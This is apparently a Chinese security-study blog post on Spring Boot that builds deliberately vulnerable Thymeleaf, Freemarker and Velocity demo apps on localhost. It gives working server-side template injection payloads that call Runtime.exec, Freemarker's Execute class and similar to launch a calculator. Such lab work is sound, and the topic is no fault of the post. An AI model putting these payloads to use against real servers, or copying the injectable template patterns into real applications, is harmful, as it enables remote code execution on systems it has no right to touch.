---
title: JavaEE应用&SpringBoot栈&模版注入&Thymeleaf&Freemarker&Velocity
published: 2026-03-17 12:00:00
description: SpringBoot框架下Thymeleaf、Freemarker、Velocity模板注入漏洞的原理分析与POC实战，涵盖路由传参、模板渲染及漏洞利用全流程。
tags: [Web开发,JavaEE]
category: 网络安全
draft: false
---

# 知识点

1. 安全开发-JavaEE-开发框架-SpringBoot&路由&传参
2. 安全开发-JavaEE-模版引擎-Thymeleaf&Freemarker&Velocity

# 开发框架-SpringBoot

参考：https://springdoc.cn/spring-boot/

## 路由映射

@RequestMapping @GetMapping等

## 参数传递

@RequestParam

## 数据响应

@RestController @Controller

@RestController注解相当于@ResponseBody＋@Controller合作用。

## 代码部分

```java
package com.example.stdemo01.Controller;

import org.springframework.web.bind.annotation.*;

@RestController
public class IndexController {

    @RequestMapping("/index")
    public String index(){
        return "index";
    }

    /*两种注解*/
    // @GetMapping("/index/{get}")
    @RequestMapping(value = "/get",method = RequestMethod.GET)
    public String get(@RequestParam String name){
        return name;
    }

    // @PostMapping("/index/{post}")
    @RequestMapping(value = "/post",method = RequestMethod.POST)
    public String post(@RequestParam String name){
        return name;
    }

}
```

# 模版引擎

## Thymeleaf

参考：https://xz.aliyun.com/news/9962

1. 新建SpringBoot项目包含Web,Thymeleaf
2. 配置application.properties修改缓存
3. 创建模版目录和文件，文件定义修改变量
4. 新建Controller目录及文件，指定路由配置
5. 更换SpringBoot及Thymeleaf版本测试POC

IndexController.java

```java
package com.example.stthymeleafdemo.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;

import java.lang.reflect.Parameter;

// 注意此处为Controller
@Controller
public class IndexController {

    @RequestMapping("/index")
    // 传参替换模板html文件中的data变量值
    public String index(Model model, @RequestParam String name) {
        model.addAttribute("data", name);
        return "index";
    }
}
```

templates->index.html

```html
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
<span th:text="${data}"></span>
</body>
</html>
```

### 模板切换

```java
package com.example.stthymeleafdemo.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.lang.reflect.Parameter;

@Controller
public class IndexController {
    @RequestMapping("/index")
    public String index(Model model, @RequestParam String lang,@RequestParam String name) {
        model.addAttribute("data", name);
        return "index"+lang;
    }
}
```

之后新建一个indexcn和indexen

此时url：

```
http://127.0.0.1:8080/index?name=随意&lang=cn
http://127.0.0.1:8080/index?name=随意&lang=en
```

### 测试POC

利用条件：**Thymeleaf漏洞版本，可控模版变量**

修改为可利用的版本，运行项目

```xml
<properties>
        <java.version>1.8</java.version>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>
        <spring-boot.version>2.2.0.RELEASE</spring-boot.version>
    </properties>
```

```
__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x

http://127.0.0.1:8080/index?name=随意&lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x
```

 ![image-20260317110943456](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260317110943456.png)

## Freemarker

参考：https://mp.weixin.qq.com/s/TtNxfSYsB4HMEpW_OBniew

1. 新建SpringBoot项目包含Web,Freemarker
2. 配置application.properties修改缓存
3. 创建模版目录和文件，文件定义修改变量
4. 新建Controller目录及文件，指定路由配置
5. 更换SpringBoot及Freemarker版本测试POC

 IndexController

```java
package com.example.stfreemarker.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class IndexController {

    @RequestMapping("/index")
    public String index(Model model) {
        model.addAttribute("username", "admin");
        model.addAttribute("password", "000000");
        return "index";
    }

}
```

index.ftl

```html
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Demo</title>
</head>
<body>
<table>
    <tr>
        <td>Username & Password</td>
    </tr>
    <tr>
        <td>${username}</td>
        <td>${password}</td>
    </tr>
</table>
</body>
</html>
```

### 测试POC

利用条件：**可控渲染的模版文件（需要控制模板的内容，比如上传 .ftl 文件、在线编辑主题模板等）**

```
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}

<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}

<#assign value="freemarker.template.utility.JythonRuntime"?new()>${value("calc.exe")}<@value>import os;os.system("calc.exe")</@value>//@value为自定义标签
```

### 默认支持

无需更换版本

在index.ftl中插入以下代码

```
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
```

当访问index页面时就会弹出计算器

### 可控变量

IndexController接收参数

```java
@RequestMapping("/index")
    public String index(Model model, @RequestParam String username, @RequestParam String password) {
        model.addAttribute("username", username);
        model.addAttribute("password", password);
        return "index";
    }
```

之后在url中拼接

```
http://localhost:8080/index?username=<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
```

没有被执行，其实就是内置功能导致，只需要可控的渲染文件即可。

## Velocity

参考：https://blog.csdn.net/2401_83799022/article/details/141600988

```xml
<dependency>
    <groupId>org.apache.velocity</groupId>
    <artifactId>velocity</artifactId>
    <version>1.7</version>
</dependency>
```

1. Velocity.evaluate
2. template.merge(ctx, out)

### Velocity.evaluate

VelocityController

```java
package com.example.stvelocitydemo.Controller;

import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.StringWriter;

@RestController
public class VelocityController {

    @RequestMapping("/ssti/velocity")
    public String velocity(@RequestParam(defaultValue = "ROOT") String username){

        // 取代文件的模板渲染过程
        String template = "Hello " + username + " | Full name: $name, phone: $phone, email: $email";
        Velocity.init();
        VelocityContext context = new VelocityContext();
        context.put("name", "超级管理员");
        context.put("phone", "13789012341");
        context.put("email", "gan@gmail.com");

        StringWriter writer = new StringWriter();
        Velocity.evaluate(context, writer, "velocity", template);
        return writer.toString();
    }
}
```

![image-20260317115525905](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260317115525905.png)

#### 测试POC

Poc

```
%23set($e%3D"e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")
```

url

```
http://localhost:8080/ssti/velocity?username=%23set($e%3D%22e%22)$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)
```

利用条件：**Velocity漏洞版本，可控模版变量或文件**

### template.merge(ctx, out)

#### 创建模板文件

在项目 的src/main/resources/templates目录下创建一个名为template.vm的文件，内容如下

```
Hello, $name!

#set($totalPrice = $price * $quantity)
The total cost for $quantity items at $price each is: $totalPrice.

#foreach($item in $items)
- Item: $item
#end

## 在模板中直接写payload
#set($e=$name.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('calc'))
```

#### 创建控制器类

接下来我们创建一个控制器类用于处理请求并返回渲染后的模板

```java
package com.example.stvelocitydemo.Controller;

import org.apache.velocity.Template;
import org.apache.velocity.app.VelocityEngine;
import org.apache.velocity.context.Context;
import org.apache.velocity.VelocityContext;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.StringWriter;
import java.util.Arrays;

@RestController
public class VelocitytmpController {

    private final VelocityEngine velocityEngine;

    @Autowired
    public VelocitytmpController(VelocityEngine velocityEngine) { //通过构造函数注入方式获得Velocity引擎实例
        this.velocityEngine = velocityEngine;
    }

    @GetMapping("/generate")
    public String generate(@RequestParam String name,
                           @RequestParam double price,
                           @RequestParam int quantity) {
        // Step 1: 加载模板
        Template template = velocityEngine.getTemplate("template.vm");

        // Step 2: 创建上下文并填充数据
        Context context = new VelocityContext();
        context.put("name", name);
        context.put("price", price);
        context.put("quantity", quantity);
        context.put("items", Arrays.asList("Apple", "Banana", "Cherry"));

        // Step 3: 合并模板和上下文
        StringWriter writer = new StringWriter();
        template.merge(context, writer);

        // 返回结果
        return writer.toString();
    }
}
```

#### 配置Velocity

为了使Velocity引擎可以工作，我们需要在Spring Boot应用程序中进行一些配置，创建一个配置类如下所示

```java
package com.example.stvelocitydemo.config;

import org.apache.velocity.app.VelocityEngine;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import java.util.Properties;

@Configuration
public class VelocityConfig {

    @Bean
    public VelocityEngine velocityEngine() {
        Properties props = new Properties();
        props.setProperty("resource.loader", "file");
        props.setProperty("file.resource.loader.path", "src/main/resources/templates"); // 模板路径

        VelocityEngine velocityEngine = new VelocityEngine(props);
        velocityEngine.init();
        return velocityEngine;
    }
}
```

#### 运行项目并进行访问

```
http://localhost:8080/generate?name=Alice&price=10.99&quantity=3
```

![image-20260317120859655](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260317120859655.png)